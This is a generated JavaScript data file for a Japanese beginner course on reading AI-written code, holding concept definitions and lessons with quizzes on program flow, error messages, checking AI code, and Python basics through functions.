// tools/build.py が自動生成するファイル。直接編集しないでください。
window.SITE_DATA = {
 "concepts": {
  "basics": {
   "name": "プログラムの基本",
   "desc": "実行の順番・入力と出力"
  },
  "reading": {
   "name": "コードの読み方",
   "desc": "どこから読むか・どう推測するか"
  },
  "variables": {
   "name": "変数と代入",
   "desc": "値に名前をつけて覚えておく仕組み"
  },
  "types": {
   "name": "型",
   "desc": "数値・文字列など、値の種類とその扱い方"
  },
  "operators": {
   "name": "演算子と式",
   "desc": "計算・比較・論理演算"
  },
  "conditionals": {
   "name": "条件分岐",
   "desc": "if / switch / match など"
  },
  "loops": {
   "name": "繰り返し",
   "desc": "for / while / イテレータ"
  },
  "collections": {
   "name": "コレクション",
   "desc": "配列・リスト・辞書・セットなど"
  },
  "functions": {
   "name": "関数",
   "desc": "処理をまとめて名前をつけ、再利用する"
  },
  "scope": {
   "name": "スコープ",
   "desc": "変数がどこから見えるか"
  },
  "strings": {
   "name": "文字列処理",
   "desc": "連結・フォーマット・正規表現など"
  },
  "errors": {
   "name": "エラー処理",
   "desc": "例外・エラーメッセージの読み方"
  },
  "modules": {
   "name": "モジュール・import",
   "desc": "ファイルやパッケージの分け方と読み込み"
  },
  "higher_order": {
   "name": "高階関数・ラムダ",
   "desc": "関数を値として渡す・返す"
  },
  "classes": {
   "name": "クラス・オブジェクト",
   "desc": "データと処理をひとまとめにする設計"
  },
  "io": {
   "name": "入出力",
   "desc": "ファイル・標準入出力"
  },
  "data_formats": {
   "name": "データ形式",
   "desc": "JSON・CSV などの読み書き"
  },
  "type_hints": {
   "name": "型注釈",
   "desc": "型ヒント・TypeScript の型"
  },
  "generics": {
   "name": "ジェネリクス",
   "desc": "型をパラメータにして使い回す"
  },
  "async": {
   "name": "非同期処理",
   "desc": "async/await・Promise"
  },
  "http_api": {
   "name": "HTTP・Web API",
   "desc": "リクエスト・レスポンス"
  },
  "dom_ui": {
   "name": "画面・DOM 操作",
   "desc": "画面の部品やイベントの扱い"
  },
  "tooling": {
   "name": "パッケージ・ツール",
   "desc": "pip・npm・設定ファイル"
  },
  "security": {
   "name": "セキュリティ",
   "desc": "入力検証・秘密情報の扱い"
  },
  "testing": {
   "name": "テスト",
   "desc": "動作を確かめるコード"
  },
  "database": {
   "name": "データベース",
   "desc": "SQL・テーブル・クエリ"
  },
  "memory": {
   "name": "メモリ・参照",
   "desc": "参照・コピー・ポインタ・所有権"
  },
  "ai_coding": {
   "name": "AI との開発",
   "desc": "頼み方・任せ方・確かめ方"
  },
  "version_control": {
   "name": "Git・バージョン管理",
   "desc": "変更の記録・差分・ブランチ"
  },
  "llm": {
   "name": "LLM・AI API",
   "desc": "AI をアプリに組み込む仕組み"
  },
  "backend": {
   "name": "バックエンドの仕組み",
   "desc": "サーバー・API・リクエストの流れ"
  },
  "auth": {
   "name": "認証・認可",
   "desc": "ログイン・パスワード・トークン・権限"
  },
  "performance": {
   "name": "性能・スケール",
   "desc": "キャッシュ・インデックス・負荷への強さ"
  },
  "deploy": {
   "name": "デプロイ・運用",
   "desc": "本番環境に出して動かし続ける"
  },
  "hardware": {
   "name": "コンピュータの仕組み",
   "desc": "CPU・メモリ・ストレージ・プロセスなど、プログラムが動く土台"
  },
  "encoding": {
   "name": "データの表し方",
   "desc": "2 進数・文字コード・数値の誤差など、データが内部でどう表されるか"
  }
 },
 "courses": [
  {
   "title": "はじめての「コードを読む」",
   "icon": "🧭",
   "order": 0,
   "description": "言語に関係なく使える、プログラムの読み方の土台。まずはここから。",
   "levels": {
    "1": "入門"
   },
   "category": "start",
   "id": "00-basics",
   "lessons": [
    {
     "title": "プログラムは「上から順番に」動く",
     "level": 1,
     "minutes": 10,
     "concepts": [
      "basics",
      "reading"
     ],
     "summary": "プログラムとは何か、コンピュータがどう実行するのかをつかむ。",
     "body": "## このレッスンのゴール\n\n- プログラムが **上から下へ、1 行ずつ** 実行されることを説明できる\n- どんなプログラムも **入力 → 処理 → 出力** の形で整理できると分かる\n\n## プログラム＝コンピュータへの指示書\n\nプログラムは「料理のレシピ」に似ています。レシピは上から順に読み、書いてある通りに手を動かします。\nコンピュータも同じで、書かれた指示を **上から順番に** 実行していきます。\n\n```python\nname = \"Ryo\"\nprint(\"こんにちは\")\nprint(name)\n```\n\n1. `name` という名前の箱に `\"Ryo\"` を入れる\n2. 「こんにちは」と表示する\n3. 箱 `name` の中身（Ryo）を表示する\n\n順番を入れ替えると結果も変わります。**「この行が実行される時点で、何が決まっているか」** を意識するのが、コードを読む第一歩です。\n\n## 入力 → 処理 → 出力\n\nどんなに大きなプログラムでも、分解するとこの 3 つになります。\n\n| | 例：天気アプリ |\n|---|---|\n| **入力** | 地名、インターネットから取ってきたデータ |\n| **処理** | 気温を℃に変換、明日の分だけ取り出す |\n| **出力** | 画面に「明日は 18℃・晴れ」と表示 |\n\nAI が書いた長いコードを渡されたら、まず **「入力はどこ？ 出力はどこ？」** を探しましょう。\n真ん中の「処理」は、あとから少しずつ読めば大丈夫です。\n\n## 「上から順番」の例外\n\n実は、上から順番に流れない場面がいくつかあります。これから学ぶ内容です。\n\n- **条件分岐（if）**：条件によって実行する行を選ぶ\n- **繰り返し（for / while）**：同じ部分を何度も実行する\n- **関数**：あとで呼ばれたときに実行される「予約」の部分\n\nこの 3 つさえ押さえれば、どの言語でもプログラムの流れを追えるようになります。\n\n## 読んでみよう\n\n```python\nprice = 1000\ntax = price * 0.1\nprint(price + tax)\n```\n\n<details><summary>何が表示される？</summary>\n\n`1100.0` が表示されます。`price * 0.1` で 100.0（小数）ができ、1000 と足して 1100.0 になります。\n入力＝`price`、処理＝税の計算、出力＝`print` です。\n\n</details>\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "プログラムは基本的にどの順番で実行される？",
        "choices": [
         "下から上へ",
         "上から下へ、1 行ずつ",
         "重要な行から順に"
        ],
        "answer": 1,
        "explain": "例外（if・ループ・関数）はあるものの、基本は上から順番です。"
       },
       {
        "question": "長いコードを渡されたとき、最初に探すとよいものは？",
        "choices": [
         "一番難しそうな行",
         "入力と出力がどこか",
         "コメントの誤字"
        ],
        "answer": 1,
        "explain": "入口と出口が分かると、真ん中の処理が「何のためにあるか」が推測しやすくなります。"
       }
      ]
     ],
     "id": "01-what-is-a-program"
    },
    {
     "title": "知らないコードを読む 5 つのコツ",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "reading"
     ],
     "summary": "初めて見るコードをどこから・どう読めばよいかの手順。",
     "body": "## このレッスンのゴール\n\n- 初めて見るコードを、決まった手順で読み始められる\n- 分からない部分を「調べるべきもの」と「気にしなくていいもの」に分けられる\n\n## コツ 1：全体をざっと眺める（細部は読まない）\n\n最初から 1 行ずつ理解しようとすると疲れてしまいます。まずはスクロールして\n\n- 何行くらいあるか\n- `def`（関数）や `class` がいくつあるか\n- 一番下で何が実行されているか\n\nだけを見ます。地図を広げて、全体の形をつかむイメージです。\n\n## コツ 2：上の方の import を見る\n\n```python\nimport requests\nimport csv\nfrom datetime import date\n```\n\n`import` は「外から道具を借りてくる」宣言です。ここを見るだけで\n「ネットに接続する（requests）」「CSV ファイルを扱う」「日付を使う」コードだと予想できます。\n\n## コツ 3：実行の入口を探す\n\nPython なら一番下の\n\n```python\nif __name__ == \"__main__\":\n    main()\n```\n\nJavaScript なら、ボタンのクリックなどの **イベント** や、一番外側で呼ばれている関数が入口です。\n入口から、呼ばれている関数を順にたどっていきます。\n\n## コツ 4：名前から意味を推測する\n\nAI のコードは名前がとても丁寧です。`fetch_weather(city)` なら「都市名を受け取って天気を取ってくる関数」と読めます。\n**中身を読む前に、名前から予想 → 中身で答え合わせ** をすると、速く・深く読めます。\n\n## コツ 5：分からないものを 3 種類に分ける\n\n| 種類 | 例 | どうする？ |\n|---|---|---|\n| 言語の文法 | `lambda`, `=>`, `async` | このサイトのレッスンで学ぶ |\n| ライブラリの機能 | `requests.get`, `pd.read_csv` | 名前から推測。必要なら公式ドキュメント |\n| そのプログラム独自の名前 | `calc_score`, `user_list` | 定義されている場所を探して読む |\n\n全部を一度に理解する必要はありません。**文法を少しずつ増やしていくのが、このサイトの目的** です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "初めて見るコードを読むとき、最初にすることとして良いのは？",
        "choices": [
         "1 行目から完全に理解するまで先に進まない",
         "全体をざっと眺めて形をつかむ",
         "分からない単語を全部調べる"
        ],
        "answer": 1,
        "explain": "細部は後回し。まず全体の形（関数の数・入口・import）をつかみます。"
       },
       {
        "question": "import 文を見ると何が分かる？",
        "choices": [
         "そのコードが外部のどんな道具を使っているか",
         "そのコードの実行にかかる時間",
         "コードを書いた人の名前"
        ],
        "answer": 0,
        "explain": "import は使う道具の一覧なので、コードの目的を推測するヒントになります。"
       },
       {
        "question": "`requests.get(url)` の `get` が分からないとき、それはどの種類？",
        "choices": [
         "言語の文法",
         "ライブラリの機能",
         "そのプログラム独自の名前"
        ],
        "answer": 1,
        "explain": "requests というライブラリが持っている機能です。名前から「URL のデータを取ってくる」と推測できます。"
       }
      ]
     ],
     "id": "02-how-to-read-code"
    },
    {
     "title": "エラーメッセージは「ヒントの手紙」",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "errors",
      "reading"
     ],
     "summary": "エラーメッセージのどこを見れば原因が分かるか。",
     "body": "## このレッスンのゴール\n\n- エラーメッセージの **一番下の行** と **行番号** を読める\n- よく出るエラーの意味がざっくり分かる\n\n## エラーは怖くない\n\nAI のコードを動かすと、エラーが出ることはよくあります。エラーメッセージは\n「どこで・何が・なぜ」うまくいかなかったかを教えてくれる **ヒントの手紙** です。\n\n```text\nTraceback (most recent call last):\n  File \"app.py\", line 12, in <module>\n    total = add(price, \"100\")\n  File \"app.py\", line 3, in add\n    return a + b\nTypeError: unsupported operand type(s) for +: 'int' and 'str'\n```\n\n## 読む順番：下から上へ\n\n1. **一番下の行**：エラーの種類と理由\n   `TypeError`（型のエラー）。「int（整数）と str（文字列）は + できない」\n2. **そのすぐ上**：エラーが起きた場所（3 行目の `return a + b`）\n3. **さらに上**：そこに至るまでの呼び出しの流れ（12 行目で `add` を呼んだ）\n\n原因は 12 行目で `\"100\"`（文字列）を渡していることです。`100`（数値）にすれば直ります。\n\n## よく出るエラー早見表（Python）\n\n| エラー | ざっくりした意味 |\n|---|---|\n| `SyntaxError` | 文法の書き間違い（カッコの閉じ忘れなど） |\n| `IndentationError` | 字下げ（インデント）がずれている |\n| `NameError` | その名前の変数・関数が見つからない（タイプミスや定義前） |\n| `TypeError` | 型が合わない（数値と文字列を足したなど） |\n| `KeyError` | 辞書にそのキーが無い |\n| `IndexError` | リストの範囲外を指定した |\n| `ModuleNotFoundError` | ライブラリがインストールされていない |\n\nJavaScript でも `TypeError` や `ReferenceError`（≒ NameError）など、似た名前のものが出てきます。\n\n## AI にエラーを聞くときのコツ\n\nエラーメッセージは **全文そのまま** 貼り付けるのが一番です。一番下の行だけだと、どこで起きたかが伝わりません。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Python のエラーメッセージ（Traceback）は、まずどこを見る？",
        "choices": [
         "一番上の行",
         "一番下の行",
         "真ん中の行"
        ],
        "answer": 1,
        "explain": "一番下にエラーの種類と理由が書かれています。"
       },
       {
        "question": "`ModuleNotFoundError: No module named 'requests'` の原因として最も考えられるのは？",
        "choices": [
         "requests という変数のタイプミス",
         "requests ライブラリがインストールされていない",
         "インデントがずれている"
        ],
        "answer": 1,
        "explain": "pip install requests でインストールすると解決することが多いです。"
       },
       {
        "question": "`NameError: name 'totl' is not defined` から分かることは？",
        "choices": [
         "totl という名前が定義されていない（total のタイプミスかも）",
         "totl の型が間違っている",
         "totl がリストの範囲外"
        ],
        "answer": 0,
        "explain": "NameError は「その名前が見つからない」エラーです。"
       }
      ]
     ],
     "id": "03-reading-errors"
    },
    {
     "title": "AI のコードを使う前のチェックリスト",
     "level": 1,
     "minutes": 10,
     "concepts": [
      "reading",
      "security"
     ],
     "summary": "AI が書いたコードを鵜呑みにせず確認するための観点。",
     "body": "## このレッスンのゴール\n\n- AI のコードを使う前に確認すべき点を 5 つ挙げられる\n- 「動いた」と「正しい」は別物だと説明できる\n\n## AI のコードは「よくできた下書き」\n\nAI はとても上手にコードを書きますが、あなたの環境や目的を完全には知りません。\n**最終的に責任を持つのは使う人** です。次の 5 点を習慣にしましょう。\n\n## ✅ チェック 1：目的と合っているか\n\n頼んだことと、コードがしていることは一致していますか？\n「CSV を読み込んで合計を出す」と頼んだのに、ファイルを **書き換える** 処理が混ざっていないか確認します。\n\n## ✅ チェック 2：前提（環境・ライブラリ）は何か\n\n- 必要なライブラリ（`import` の行）はインストール済み？\n- ファイルの場所（パス）は自分の環境に合っている？\n- Python や Node.js のバージョンは？\n\n## ✅ チェック 3：うまくいかない時にどうなるか\n\nファイルが無い、ネットが切れている、入力が空…。\n**エラー処理**（`try` / `except` など）が無いと、そこで止まってしまいます。\n\n## ✅ チェック 4：秘密情報と危ない操作\n\n```python\nAPI_KEY = \"sk-1234567890abcdef\"   # ← コードに直接書くのは危険\n```\n\n- パスワードや API キーがコードに直書きされていないか（環境変数を使うのが基本）\n- `rm -rf`、`DELETE FROM` など **消す系** の操作が無いか\n- ユーザーの入力をそのまま SQL やコマンドに混ぜていないか\n\n## ✅ チェック 5：自分の言葉で説明できるか\n\n最後はこれです。**人に説明できないコードは、壊れたときに直せません。**\n「30 秒で説明するなら？」を自分に問いかけてみましょう。\n\n## まとめ\n\n| チェック | 一言で |\n|---|---|\n| 目的 | 頼んだ通り？ |\n| 前提 | 自分の環境で動く？ |\n| 失敗時 | 壊れたらどうなる？ |\n| 安全 | 秘密・削除・入力は大丈夫？ |\n| 説明 | 自分の言葉で言える？ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "API キーの扱いとして良いのは？",
        "choices": [
         "コードの先頭に直接書く",
         "環境変数などコードの外に置く",
         "コメントに書いておく"
        ],
        "answer": 1,
        "explain": "コードに書くと、GitHub などに公開したときに漏れてしまいます。"
       },
       {
        "question": "「AI のコードを実行したら動いた」。これで十分と言える？",
        "choices": [
         "はい、動けば正しい",
         "いいえ、目的・失敗時・安全性も確認が必要"
        ],
        "answer": 1,
        "explain": "動くことと、正しく安全であることは別です。"
       }
      ]
     ],
     "id": "04-checking-ai-code"
    }
   ],
   "status": "open"
  },
  {
   "title": "Python",
   "icon": "🐍",
   "order": 10,
   "description": "AI が最もよく書く言語のひとつ。読みやすく、すべての言語の比較の基準になる。",
   "levels": {
    "1": "入門",
    "2": "基礎",
    "3": "実践",
    "4": "応用"
   },
   "id": "10-python",
   "lessons": [
    {
     "title": "変数と型",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "variables",
      "types",
      "operators"
     ],
     "summary": "値に名前をつける「変数」と、値の種類「型」。",
     "body": "## このレッスンのゴール\n\n- `=` が「等しい」ではなく **代入** だと説明できる\n- 4 つの基本の型（int / float / str / bool）を見分けられる\n\n## 変数＝名前のついた箱\n\n```python\nage = 20\nname = \"Ryo\"\nage = age + 1   # 右側を計算してから、左の箱に入れ直す → 21\n```\n\n`=` は数学の「等しい」ではなく、**右の値を左の名前に入れる** という意味です。\nだから `age = age + 1` という、数学ではありえない式が成り立ちます。\n\n## 基本の型\n\n| 型 | 例 | 意味 |\n|---|---|---|\n| `int` | `20`, `-3` | 整数 |\n| `float` | `3.14`, `1.0` | 小数 |\n| `str` | `\"hello\"`, `'あ'` | 文字列（`\"` か `'` で囲む） |\n| `bool` | `True`, `False` | 真偽値（はい / いいえ） |\n| `None` | `None` | 「何もない」を表す特別な値 |\n\n```python\nprint(type(3.14))   # <class 'float'>\nprint(\"1\" + \"2\")    # \"12\"  ← 文字列どうしは連結\nprint(1 + 2)        # 3\n```\n\n**同じ見た目でも型が違えば動きが違う** のがポイントです。\n\n## 型の変換\n\n```python\nint(\"42\")      # 42（文字列 → 整数）\nstr(42)        # \"42\"\nfloat(\"1.5\")   # 1.5\n```\n\n`input()` で受け取った値はいつも文字列なので、計算するときは `int(...)` で変換します。AI のコードでもよく見る形です。\n\n## 演算子\n\n| 記号 | 意味 | 例 |\n|---|---|---|\n| `+ - * /` | 四則演算（`/` は常に小数になる） | `7 / 2` → `3.5` |\n| `//` | 割り算の整数部分 | `7 // 2` → `3` |\n| `%` | 割り算の余り | `7 % 2` → `1` |\n| `**` | べき乗 | `2 ** 3` → `8` |\n| `== !=` | 等しい / 等しくない | `a == 1` |\n| `< > <= >=` | 大小比較 | |\n| `and or not` | かつ / または / ではない | |\n\n## AI のコードではこう出てくる\n\n```python\nMAX_RETRIES = 3          # 全部大文字 = 「変えない値（定数）」という慣習\nuser_count: int = 0      # 「: int」は型ヒント（Lv4 で学びます）\nis_valid = False         # is_ で始まる名前は bool のことが多い\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`x = 5` の次に `x = x * 2` を実行すると x は？",
        "choices": [
         "5",
         "10",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "右側（5 * 2 = 10）を計算してから x に入れ直します。"
       },
       {
        "question": "`\"3\" + \"4\"` の結果は？",
        "choices": [
         "7",
         "\"34\"",
         "エラー"
        ],
        "answer": 1,
        "explain": "文字列どうしの + は連結です。"
       },
       {
        "question": "`10 % 3` の結果は？",
        "choices": [
         "3",
         "3.33",
         "1"
        ],
        "answer": 2,
        "explain": "% は割り算の余りです。"
       }
      ]
     ],
     "id": "01-variables-and-types"
    },
    {
     "title": "条件分岐 if",
     "level": 1,
     "minutes": 10,
     "concepts": [
      "conditionals",
      "operators"
     ],
     "summary": "条件によって実行する処理を変える。",
     "body": "## このレッスンのゴール\n\n- `if / elif / else` の流れを追える\n- Python では **インデント（字下げ）がブロックを表す** と説明できる\n\n## 基本形\n\n```python\nscore = 75\n\nif score >= 80:\n    print(\"よくできました\")\nelif score >= 60:\n    print(\"合格\")\nelse:\n    print(\"もう少し\")\n```\n\n1. 上から条件を順に調べる\n2. **最初に当てはまったブロックだけ** を実行し、残りは飛ばす\n3. どれにも当てはまらなければ `else`\n\nこの例では `score >= 80` は偽、`score >= 60` が真なので「合格」だけ表示されます。\n\n## インデントが大事\n\n```python\nif score >= 60:\n    print(\"合格\")      # if の中\n    print(\"おめでとう\") # if の中\nprint(\"終わり\")         # if の外（必ず実行される）\n```\n\n多くの言語は `{ }` でブロックを囲みますが、Python は **字下げ（スペース 4 つ）** で表します。\n他の言語と比べるときのとても大事な違いです。\n\n## 「真」とみなされる値\n\nPython では `if` に bool 以外も置けます。\n\n```python\nitems = []\nif items:          # 空のリストは「偽」\n    print(\"あり\")\nelse:\n    print(\"空っぽ\")\n```\n\n`0`、`\"\"`（空文字）、`[]`、`{}`、`None` は偽、それ以外は真として扱われます。AI のコードで `if not data:` とあれば「data が空なら」という意味です。\n\n## 1 行で書く形（条件式）\n\n```python\nlabel = \"成人\" if age >= 18 else \"未成年\"\n```\n\n「条件が真なら左、偽なら右」。AI がよく使う短い書き方です。\n\n## 他の言語では\n\n```javascript\n// JavaScript\nif (score >= 80) {\n  console.log(\"よくできました\");\n} else if (score >= 60) {\n  console.log(\"合格\");\n}\n```\n\n`elif` が `else if` に、インデントが `{ }` に変わるだけで、考え方は同じです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "score = 85 のとき、上の「基本形」の例で表示されるのは？",
        "choices": [
         "よくできました",
         "よくできました と 合格",
         "合格"
        ],
        "answer": 0,
        "explain": "最初に当てはまったブロックだけが実行されます。"
       },
       {
        "question": "`if not name:` は何を調べている？",
        "choices": [
         "name が \"not\" という文字列か",
         "name が空（または None など偽の値）か",
         "name が定義されていないか"
        ],
        "answer": 1,
        "explain": "not は否定。空文字や None は偽なので、「name が空なら」という意味になります。"
       },
       {
        "question": "`x = \"A\" if ok else \"B\"` で ok が False のとき x は？",
        "choices": [
         "\"A\"",
         "\"B\""
        ],
        "answer": 1,
        "explain": "条件が偽なので else の右側が使われます。"
       }
      ]
     ],
     "id": "02-conditionals"
    },
    {
     "title": "繰り返し for と while",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "loops",
      "collections"
     ],
     "summary": "同じ処理を何度も実行する仕組み。",
     "body": "## このレッスンのゴール\n\n- `for` が「中身を 1 つずつ取り出す」ループだと説明できる\n- `range`、`enumerate`、`break`、`continue` を読める\n\n## for：1 つずつ取り出す\n\n```python\nfruits = [\"りんご\", \"バナナ\", \"みかん\"]\nfor fruit in fruits:\n    print(fruit)\n```\n\n`fruits` から 1 つずつ取り出して `fruit` に入れ、ブロックを実行 —— を最後まで繰り返します。\n\n## range：回数で回す\n\n```python\nfor i in range(3):\n    print(i)    # 0, 1, 2\n```\n\n`range(3)` は 0, 1, 2（**3 は含まない**）。`range(1, 4)` なら 1, 2, 3 です。\n\n## enumerate：番号もほしいとき\n\n```python\nfor i, fruit in enumerate(fruits):\n    print(i, fruit)   # 0 りんご / 1 バナナ / 2 みかん\n```\n\nAI のコードで非常によく見る形です。`i, fruit` のように 2 つ同時に受け取る書き方を **アンパック** と呼びます。\n\n## while：条件が真のあいだ回す\n\n```python\ncount = 0\nwhile count < 3:\n    print(count)\n    count += 1     # count = count + 1 の短縮形\n```\n\n条件がずっと真のままだと **無限ループ** になります。`while True:` は「`break` で抜けるまで回り続ける」という意図的な書き方です。\n\n## break と continue\n\n```python\nfor n in [1, 2, 3, 4, 5]:\n    if n == 2:\n        continue   # 今回だけ飛ばして次へ\n    if n == 4:\n        break      # ループ自体を終了\n    print(n)       # 1, 3\n```\n\n## 他の言語では\n\n```javascript\nfor (const fruit of fruits) { console.log(fruit); }     // JS の for...of ≒ Python の for\nfor (let i = 0; i < 3; i++) { console.log(i); }         // C 言語風：初期化; 条件; 更新\n```\n\nC・Java・JavaScript で見る `for (let i = 0; i < 3; i++)` は、Python の `for i in range(3)` と同じ意味です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`range(2, 5)` が作る数は？",
        "choices": [
         "2, 3, 4, 5",
         "2, 3, 4",
         "3, 4, 5"
        ],
        "answer": 1,
        "explain": "終わりの数は含みません。"
       },
       {
        "question": "ループの中で `continue` が実行されると？",
        "choices": [
         "ループ全体が終わる",
         "今回の残りを飛ばして次の回へ進む",
         "プログラムが止まる"
        ],
        "answer": 1,
        "explain": "ループ全体を終えるのは break です。"
       },
       {
        "question": "`for (let i = 0; i < 3; i++)` を Python で書くと？",
        "choices": [
         "for i in range(3):",
         "for i in 3:",
         "while i < 3:"
        ],
        "answer": 0,
        "explain": "どちらも 0, 1, 2 の 3 回まわります。"
       }
      ]
     ],
     "id": "03-loops"
    },
    {
     "title": "リストと辞書",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "collections",
      "memory"
     ],
     "summary": "複数の値をまとめて扱うデータ構造。",
     "body": "## このレッスンのゴール\n\n- リスト（順番で管理）と辞書（名前で管理）を使い分けて説明できる\n- JSON や API のデータが「辞書とリストの組み合わせ」だと分かる\n\n## リスト：順番に並んだデータ\n\n```python\nscores = [80, 65, 92]\nscores[0]        # 80（番号＝インデックスは 0 から）\nscores[-1]       # 92（マイナスは後ろから）\nscores.append(70)  # 末尾に追加 → [80, 65, 92, 70]\nlen(scores)      # 4（要素の数）\nscores[1:3]      # [65, 92]（スライス：1 番目から 3 番目の手前まで）\n```\n\n## 辞書：名前（キー）でデータを取り出す\n\n```python\nuser = {\"name\": \"Ryo\", \"age\": 20}\nuser[\"name\"]           # \"Ryo\"\nuser[\"email\"] = \"a@b\"  # 追加\nuser.get(\"tel\")        # None（無くてもエラーにならない）\nuser[\"tel\"]            # KeyError！（無いキー）\n```\n\nAI のコードで `.get(\"key\", 既定値)` が多いのは、**キーが無い場合でも止まらないようにするため** です。\n\n## 辞書をループする\n\n```python\nfor key, value in user.items():\n    print(key, value)\n```\n\n## 組み合わせ ＝ 現実のデータの形\n\n```python\nusers = [\n    {\"name\": \"Ryo\", \"skills\": [\"Python\", \"SQL\"]},\n    {\"name\": \"Ken\", \"skills\": [\"Go\"]},\n]\nusers[0][\"skills\"][1]   # \"SQL\"\n```\n\nWeb API から返ってくる JSON は、ほぼこの形です。\n**外側から 1 段ずつ「リストなら番号、辞書ならキー」** と読んでいけば、どんなに深くても読めます。\n\n## 注意：コピーではなく「同じものを指す」\n\n```python\na = [1, 2]\nb = a\nb.append(3)\nprint(a)   # [1, 2, 3] ← a も変わる！\n```\n\n`b = a` は箱の中身をコピーするのではなく、**同じリストに 2 つ目の名札をつける** だけです。\n別物にしたいときは `b = a.copy()`。AI のコードにバグが潜みやすいポイントです。\n\n## その他のコレクション\n\n| 名前 | 書き方 | 特徴 |\n|---|---|---|\n| タプル | `(1, 2)` | 変更できないリスト |\n| セット | `{1, 2}` | 重複なし・順番なし |\n\n## 他の言語では\n\n| Python | JavaScript | 多くの言語での呼び名 |\n|---|---|---|\n| リスト `[1, 2]` | 配列 `[1, 2]` | 配列 / Array / Vec |\n| 辞書 `{\"a\": 1}` | オブジェクト `{a: 1}` / Map | マップ / ハッシュ / Dictionary |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`colors = [\"赤\", \"青\", \"緑\"]` のとき `colors[1]` は？",
        "choices": [
         "\"赤\"",
         "\"青\"",
         "\"緑\""
        ],
        "answer": 1,
        "explain": "インデックスは 0 から数えます。"
       },
       {
        "question": "辞書に無いキーを `d[\"x\"]` で取り出すと？",
        "choices": [
         "None が返る",
         "KeyError になる",
         "空文字が返る"
        ],
        "answer": 1,
        "explain": "エラーにしたくないときは d.get(\"x\") を使います。"
       },
       {
        "question": "`data[\"items\"][0][\"price\"]` はどう読む？",
        "choices": [
         "data の \"items\"（リスト）の 0 番目（辞書）の \"price\"",
         "data の 0 番目の \"items\" の \"price\""
        ],
        "answer": 0,
        "explain": "左から 1 段ずつ、辞書ならキー・リストなら番号で取り出します。"
       }
      ]
     ],
     "id": "04-lists-and-dicts"
    },
    {
     "title": "関数",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "functions",
      "scope"
     ],
     "summary": "処理に名前をつけてまとめ、何度も使えるようにする。",
     "body": "## このレッスンのゴール\n\n- 引数・戻り値・呼び出しの関係を説明できる\n- デフォルト引数とキーワード引数を読める\n- 「関数の中の変数は外から見えない（スコープ）」と分かる\n\n## 関数の形\n\n```python\ndef add_tax(price, rate=0.1):\n    \"\"\"税込み価格を返す\"\"\"   # ← docstring（関数の説明書き）\n    return price * (1 + rate)\n\ntotal = add_tax(1000)          # 1100.0\ntotal2 = add_tax(1000, 0.08)   # 1080.0\n```\n\n| 部分 | 意味 |\n|---|---|\n| `def` | 関数を定義する（この時点では **実行されない**） |\n| `price, rate` | 引数（パラメータ）：受け取る値 |\n| `rate=0.1` | デフォルト値：渡されなければ 0.1 |\n| `return` | 戻り値：呼び出し元に返す値 |\n\n`def` は「予約」です。**呼ばれたときに初めて中身が実行されます**。\nコードを読むときは、`def` を見たら「こういう道具がある」とだけ覚えて、呼ばれている場所から追いかけましょう。\n\n## return が無い関数\n\n```python\ndef greet(name):\n    print(f\"こんにちは {name}\")\n\nresult = greet(\"Ryo\")   # 表示はされるが…\nprint(result)           # None\n```\n\n`return` が無いと `None` が返ります。「表示する」と「返す」は別物です。\n\n## キーワード引数\n\n```python\nadd_tax(price=1000, rate=0.08)\nrequests.get(url, timeout=10)\n```\n\n`名前=値` で渡すと、順番を気にせず意味もはっきりします。AI のコードやライブラリの呼び出しで多用されます。\n\n## スコープ：変数が見える範囲\n\n```python\ndef calc():\n    temp = 5      # 関数の中だけで使える（ローカル変数）\n    return temp * 2\n\ncalc()\nprint(temp)       # NameError！ 外からは見えない\n```\n\n関数の中の変数は、その関数が終わると消えます。これのおかげで、関数どうしが変数名でぶつかりません。\n\n## *args と **kwargs\n\n```python\ndef log(*args, **kwargs):\n    print(args)     # 位置引数をタプルで受け取る\n    print(kwargs)   # キーワード引数を辞書で受け取る\n\nlog(1, 2, level=\"info\")   # (1, 2) / {'level': 'info'}\n```\n\n「いくつ渡されてもよい」という意味。ライブラリのコードでよく見ます。\n\n## 他の言語では\n\n```javascript\nfunction addTax(price, rate = 0.1) { return price * (1 + rate); }  // JavaScript\n```\n```go\nfunc addTax(price float64, rate float64) float64 { return price * (1 + rate) }  // Go（型を書く）\n```\n\nキーワードが `def` / `function` / `func` / `fn` と変わっても、**名前・引数・戻り値** という骨組みは共通です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`def` で関数を定義した時点で、中身は実行される？",
        "choices": [
         "はい",
         "いいえ、呼び出されたときに実行される"
        ],
        "answer": 1,
        "explain": "def は「予約」です。"
       },
       {
        "question": "return の無い関数の戻り値は？",
        "choices": [
         "0",
         "None",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "何も返さないと None が返ります。"
       },
       {
        "question": "`def f(a, b=2): return a + b` に対して `f(1)` は？",
        "choices": [
         "1",
         "3",
         "エラー"
        ],
        "answer": 1,
        "explain": "b はデフォルト値の 2 が使われます。"
       }
      ]
     ],
     "id": "05-functions"
    },
    {
     "title": "文字列と f-string",
     "level": 2,
     "minutes": 10,
     "concepts": [
      "strings"
     ],
     "summary": "文字列の組み立て・加工でよく使う書き方。",
